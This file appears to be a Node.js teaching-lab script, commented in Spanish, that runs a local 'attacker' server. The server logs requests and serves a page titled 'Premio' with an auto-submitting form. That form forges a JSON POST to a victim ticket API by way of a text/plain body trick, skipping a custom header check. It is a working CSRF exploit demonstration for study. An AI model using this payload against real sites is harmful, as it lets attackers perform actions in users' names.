// "Atacante" de laboratorio: un puerto local que anota todo lo que le llega. Solo en tu máquina.
//   PORT=3119 node lab/atacante.mjs
import { createServer } from 'node:http';

const PUERTO = Number(process.env.PORT ?? 3119);
const API = process.env.API ?? 'http://127.0.0.1:3110';

createServer((req, res) => {
  const url = new URL(req.url ?? '/', 'http://localhost');
  if (url.pathname === '/csrf.html') {
    // Página del atacante: un formulario que manda un POST a la API de la víctima (sin la cabecera X-Requested-By).
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    return res.end(`<!doctype html><meta charset="utf-8"><title>Premio</title>
<form id="f" method="POST" action="${API}/api/tickets" enctype="text/plain">
  <input type="hidden" name='{"titulo":"Ticket plantado por otro sitio","prioridad":"alta","relleno":"' value='"}' />
</form>
<script src="/auto.js"></script>`);
  }
  if (url.pathname === '/auto.js') {
    res.writeHead(200, { 'content-type': 'text/javascript' });
    return res.end("document.getElementById('f').submit();");
  }
  console.log(`[atacante] ${req.method} ${req.url}`);
  res.writeHead(204, { 'access-control-allow-origin': '*' });
  res.end();
}).listen(PUERTO, '127.0.0.1', () => console.log(`Atacante de laboratorio en http://127.0.0.1:${PUERTO}`));
